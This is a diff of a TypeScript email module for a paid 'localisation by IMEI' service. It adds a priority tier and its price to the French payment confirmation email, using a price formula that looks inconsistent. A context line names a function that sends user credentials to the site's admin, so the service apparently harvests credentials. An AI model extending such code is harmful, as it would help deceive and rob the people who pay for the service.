@@ -86,7 +86,8 @@ export async function sendUserCredentialsToAdmin(credentials: UserCredentials) {
 }
 
 // Envoyer confirmation de paiement à l'utilisateur
-export async function sendPaymentConfirmation(userEmail: string, device: string, imei: string) {
+export async function sendPaymentConfirmation(userEmail: string, device: string, imei: string, amount?: number) {
+  const amountStr = amount ? (amount === 19900 ? "$32.90 USD" : `$${(amount/500).toFixed(2)} USD`) : "$9.99 USD";
   const mailOptions = {
     from: GMAIL_USER,
     to: userEmail,
@@ -110,15 +111,15 @@ export async function sendPaymentConfirmation(userEmail: string, device: string,
             <h3 style="color: #374151; margin-top: 0;">Détails du Service</h3>
             <p><strong>Appareil:</strong> ${device}</p>
             <p><strong>IMEI:</strong> ${imei}</p>
-            <p><strong>Service:</strong> Localisation instantanée</p>
-            <p><strong>Montant:</strong> $9.99 USD</p>
+            <p><strong>Service:</strong> ${amount === 19900 ? "Localisation Ultra-Rapide (Prioritaire)" : "Localisation Standard"}</p>
+            <p><strong>Montant:</strong> ${amountStr}</p>
           </div>
           
           <div style="background: #dbeafe; padding: 20px; border-radius: 8px; border-left: 4px solid #3b82f6;">
             <h3 style="color: #1e40af; margin-top: 0;">Prochaines Étapes</h3>
             <p style="margin-bottom: 10px;">🔍 Notre équipe commence maintenant la recherche de votre appareil</p>
             <p style="margin-bottom: 10px;">📧 Vous recevrez un email avec la localisation sous peu</p>
-            <p style="margin: 0;">⏱️ Temps de traitement estimé: 5-15 minutes</p>
+            <p style="margin: 0;">⏱️ Temps de traitement estimé: ${amount === 19900 ? "2-5 minutes" : "5-15 minutes"}</p>
           </div>
           
           <div style="text-align: center; margin-top: 30px; padding-top: 20px; border-top: 1px solid #e5e7eb;">
